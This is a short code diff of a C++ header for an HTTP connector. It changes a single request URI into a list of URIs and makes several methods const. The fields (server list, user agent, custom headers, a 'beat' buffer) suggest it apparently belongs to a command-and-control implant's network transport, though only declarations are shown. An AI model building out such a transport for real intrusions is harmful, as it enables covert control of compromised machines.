@@ -11,7 +11,8 @@ typedef struct {
 	WORD*  ports;
 	BOOL   use_ssl;
 	BYTE*  http_method;
-	BYTE*  uri;
+	ULONG  uri_count;
+	BYTE**  uris;
 	BYTE*  parameter;
 	BYTE*  user_agent;
 	BYTE*  http_headers;
@@ -60,7 +61,8 @@ class ConnectorHTTP
 	ULONG  server_count   = 0;
 	CHAR** server_address = NULL;
 	WORD*  server_ports   = 0;
-	CHAR*  uri            = NULL;
+	ULONG  uri_count	  = 0;
+	CHAR** uris           = NULL;
 	CHAR*  headers        = NULL;
 	ULONG  ans_size       = 0;
 	ULONG  ans_pre_size   = 0;
@@ -78,11 +80,11 @@ class ConnectorHTTP
 public:
 	ConnectorHTTP();
 
-	BOOL SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize);
+	BOOL SetConfig(const ProfileHTTP& profile, const BYTE* beat, ULONG beatSize);
 	void CloseConnector();
 
 	void  SendData(BYTE* data, ULONG data_size);
-	BYTE* RecvData();
-	int   RecvSize();
+	BYTE* RecvData() const;
+	int   RecvSize() const;
 	void  RecvClear();
 };
